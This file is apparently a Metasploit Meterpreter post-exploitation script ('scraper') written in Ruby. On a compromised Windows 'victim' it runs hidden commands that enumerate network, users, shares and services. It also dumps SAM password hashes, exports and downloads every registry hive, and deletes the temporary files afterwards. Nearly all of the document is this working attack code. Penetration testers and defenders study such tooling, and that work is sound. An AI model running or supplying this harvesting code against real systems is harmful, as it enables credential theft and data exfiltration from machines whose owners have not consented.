# This is a Meterpreter script designed to be used by the Metasploit Framework
#
# The goal of this script is to obtain system information from a victim through
# an existing Meterpreter session. This is only a simple example of what can
# be accomplished through Meterpreter scripting.
#
# hdm[at]metasploit.com
#
opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu." ]
)

opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line("Scraper -- harvest system info including network shares, registry hives and password hashes")
    print_line("Info is stored in " + ::File.join(Msf::Config.log_directory,"scripts", "scraper"))
    print_line("USAGE: run scraper")
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

require 'fileutils'

# Some of this script was developed in conjunction with _MAX_ (max[at]remote-exploit.org)
# The complete version will be released in the future as 'autometer'

# Delete a file (meterpreter has no unlink API yet)
def m_unlink(client, path)
  r = client.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
  while(r.name)
    select(nil, nil, nil, 0.10)
  end
  r.close
end
def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
# Exec a command and return the results
def m_exec(client, cmd)
  begin
    r = client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
    b = ""
    while(d = r.channel.read)
      b << d
      break if d == ""
    end
    r.channel.close
    r.close
    b
  rescue ::Exception => e
    print_error("Failed to run command #{cmd}")
    print_error("Error: #{e.class} #{e}")
  end
end




# Extract the host and port
host,port = client.session_host, client.session_port

print_status("New session on #{host}:#{port}...")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts','scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) )

# Create the log directory
::FileUtils.mkdir_p(logs)

unsupported if client.platform !~ /win32|win64/i
begin

  tmp = client.sys.config.getenv('TEMP')

  print_status("Gathering basic system information...")

  ::File.open(File.join(logs, "network.txt"), "w") do |fd|
    fd.puts("=" * 70)
    client.net.config.each_route do |route|
      fd.puts("Local subnet: #{route.subnet}/#{route.netmask}")
    end

    fd.puts("=" * 70)
    fd.puts(m_exec(client, "netstat -na"))

    fd.puts("=" * 70)
    fd.puts(m_exec(client, "netstat -ns"))
  end

  info = client.sys.config.sysinfo()
  ::File.open(File.join(logs, "system.txt"), "w") do |fd|
    fd.puts("Computer: #{info['Computer']}")
    fd.puts("OS: #{info['OS']}")
  end

  ::File.open(File.join(logs, "env.txt"), "w") do |fd|
    fd.puts(m_exec(client, "cmd.exe /c set"))
  end

  ::File.open(File.join(logs, "users.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net user"))
  end

  ::File.open(File.join(logs, "shares.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net share"))
  end

  ::File.open(File.join(logs, "services.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net start"))
  end

  ::File.open(File.join(logs, "nethood.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net view"))
  end

  ::File.open(File.join(logs, "localgroup.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net localgroup"))
  end

  ::File.open(File.join(logs, "group.txt"), "w") do |fd|
    fd.puts(m_exec(client, "net group"))
  end

  ::File.open(File.join(logs, "systeminfo.txt"), "w") do |fd|
    fd.puts(m_exec(client, "systeminfo"))
  end

  begin
    client.core.use("priv")
    hashes = client.priv.sam_hashes
    print_status("Dumping password hashes...")
    ::File.open(File.join(logs, "hashes.txt"), "w") do |fd|
      hashes.each do |user|
        fd.puts(user.to_s)
      end
    end
  rescue ::Exception => e
    print_status("Error dumping hashes: #{e.class} #{e}")
  end

  print_status("Obtaining the entire registry...")
  hives = %w{HKCU HKLM HKCC HKCR HKU}
  hives.each do |hive|
    print_status(" Exporting #{hive}")

    tempname = "#{tmp}\\#{Rex::Text.rand_text_alpha(8)}.reg"
    m_exec(client, "reg.exe export #{hive} #{tempname}")

    print_status(" Downloading #{hive} (#{tempname})")
    client.fs.file.download_file(File.join(logs, "#{hive}.reg"), tempname)

    print_status(" Cleaning #{hive}")
    m_unlink(client, tempname)
  end

  print_status("Completed processing on #{host}:#{port}...")

rescue ::Exception => e
  print_status("Exception: #{e.class} #{e} #{e.backtrace}")
end

